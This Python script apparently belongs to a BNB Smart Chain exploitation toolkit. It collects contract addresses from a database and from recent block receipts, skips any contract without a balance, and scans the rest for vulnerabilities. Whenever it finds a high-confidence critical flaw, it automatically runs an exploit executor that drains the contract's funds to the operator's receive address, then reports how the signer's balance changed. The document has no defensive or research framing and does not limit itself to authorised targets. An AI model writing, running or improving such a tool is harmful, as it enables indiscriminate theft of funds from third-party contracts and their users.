#!/usr/bin/env python3
"""Deep BSC scan — finds contracts with balance via block receipts + DB."""
import logging, time, tomllib, os, sqlite3
from decimal import Decimal
from src.rpc import RpcClient
from src.types import TokenInfo, PoolInfo, Chain, ContractTarget
from src.scanners.evm_scanner import EvmScanner
from src.data import DataCollector
from src.explorer import ExplorerClient
from src.verifiers.runner import VerifierRunner
from src.verifiers.honeypot import HoneypotVerifier
from src.verifiers.exploit_simulator import SimulatedExploitVerifier
from src.verifiers.multi_step import MultiStepVerifier
from src.exploit_executor import ExploitExecutor
from src.signer import load_evm_private_key, get_receive_address
from src.reporter.json_report import JsonReporter
from src.sources.blockscout import BlockscoutRecentSource

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")
logger = logging.getLogger("bsc-deep")

CHAIN = Chain.BSC

def load_config():
    with open("config.toml", "rb") as f:
        return tomllib.load(f)

def get_bal(rpc, addr):
    try:
        raw = rpc.call("eth_getBalance", [addr, "latest"])
        bal_str = raw.get("result", "0x0") if isinstance(raw, dict) else str(raw)
        return int(str(bal_str), 16) / 1e18
    except:
        return 0.0

def get_code(rpc, addr):
    try:
        raw = rpc.call("eth_getCode", [addr, "latest"])
        return raw.get("result", "") if isinstance(raw, dict) else str(raw)
    except:
        return ""

def scan_contract(addr, rpc, scanner, executor, receive):
    bal = get_bal(rpc, addr)
    if bal < 0.0003:
        return None
    
    code = get_code(rpc, addr)
    if not code or code in ("0x", "0x0"):
        return None
    
    token = TokenInfo(address=addr, symbol=addr[:10], chain=CHAIN)
    pool = PoolInfo(address="", dex="direct", liquidity_usd=Decimal("0"))
    
    try:
        report = scanner.scan(token, pool)
        critical = [f for f in report.findings if f.severity.name == "CRITICAL"]
        if critical:
            for finding in critical:
                if executor and finding.confidence is not None and finding.confidence >= 0.9:
                    can_execute = executor.can_execute(finding)
                    if can_execute:
                        logger.info("  Draining %s via %s...", addr[:10], finding.check_name)
                        result = executor.execute(finding, token, chain=CHAIN, receive_address=receive)
                        logger.info("  Drain result: %s", result)
            return (addr, bal, critical)
        return (addr, bal, [])
    except Exception as e:
        logger.error("Scan failed %s: %s", addr[:10], e)
        return None

def main():
    config = load_config()
    rpc = RpcClient(config["rpc"]["bsc"])
    signer = load_evm_private_key()
    receive = get_receive_address(CHAIN) or signer.address
    executor = ExploitExecutor(signer) if signer else None

    initial_bal = get_bal(rpc, signer.address)
    logger.info("Signer: %s | Receive: %s | Balance: %.6f BNB", signer.address, receive, initial_bal)

    explorer = ExplorerClient()
    data = DataCollector(rpc=rpc, explorer=explorer)
    verifier_runner = VerifierRunner(verifiers=[
        HoneypotVerifier(), SimulatedExploitVerifier(), MultiStepVerifier(),
    ])
    scanner = EvmScanner(data_collector=data, rpc=rpc, verifier_runner=verifier_runner, executor=executor)

    # Step 1: collect addresses from DB
    addresses = set()
    db_path = config["analyzer"]["db_path"]
    try:
        db = sqlite3.connect(db_path)
        for row in db.execute("SELECT address FROM pending_tokens WHERE chain='bsc'"):
            addresses.add(row[0].lower())
        for row in db.execute("SELECT address FROM contract_targets WHERE chain='bsc'"):
            addresses.add(row[0].lower())
        db.close()
        logger.info("Loaded %d BSC addresses from DB", len(addresses))
    except Exception as e:
        logger.warning("DB load: %s", e)

    # Step 2: also scan recent blocks for new contracts
    latest_raw = rpc.call("eth_blockNumber", [])
    latest = int(latest_raw.get("result","0x0"), 16) if isinstance(latest_raw, dict) else int(str(latest_raw), 16)
    logger.info("Latest BSC block: %d", latest)
    
    blocks_back = 2000  # ~1.5 hours
    new_contracts = 0
    for bn in range(latest, latest - blocks_back, -1):
        try:
            receipts = rpc.call("eth_getBlockReceipts", [hex(bn)])
            if not isinstance(receipts, list):
                continue
            for r in receipts:
                contract_addr = r.get("contractAddress", "")
                if contract_addr and contract_addr.startswith("0x"):
                    addr = contract_addr.lower()
                    if addr not in addresses:
                        addresses.add(addr)
                        new_contracts += 1
        except Exception as e:
            pass
        if bn % 500 == 0:
            logger.info("Block scan: %d/%d, new contracts: %d, total: %d", 
                       latest - bn, blocks_back, new_contracts, len(addresses))
        time.sleep(0.05)  # rate limit

    logger.info("Total BSC addresses to scan: %d (incl %d new from blocks)", len(addresses), new_contracts)

    # Step 3: scan all addresses
    findings = []
    for i, addr in enumerate(addresses):
        result = scan_contract(addr, rpc, scanner, executor, receive)
        if result:
            findings.append(result)
        if (i+1) % 100 == 0:
            logger.info("Scan progress: %d/%d, %d findings", i+1, len(addresses), len(findings))
        time.sleep(0.2)

    logger.info("="*60)
    logger.info("BSC SCAN DONE — %d findings", len(findings))
    for addr, bal, crits in findings:
        if crits:
            logger.info(">> %s | %.4f BNB | %s", addr[:10], bal, " | ".join(f"{f.check_name} conf={f.confidence}" for f in crits))

    final_bal = get_bal(rpc, signer.address)
    logger.info("Signer: %.6f → %.6f BNB (spent: %.6f)", initial_bal, final_bal, initial_bal - final_bal)

if __name__ == "__main__":
    main()
